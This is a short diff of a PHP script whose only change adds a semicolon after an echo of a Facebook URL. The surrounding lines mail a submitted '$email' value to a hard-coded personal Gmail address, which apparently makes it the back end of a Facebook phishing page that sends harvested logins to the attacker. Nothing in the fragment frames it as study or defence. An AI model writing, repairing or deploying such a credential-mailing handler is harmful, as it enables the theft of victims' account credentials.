@@ -8,5 +8,5 @@ $recipient = "israelstoba@gmail.com"
 mail($recipient, $email, $mailheader)
 or die("Error");
 
-echo"https://web.facebook.com"
+echo"https://web.facebook.com";
 ?>
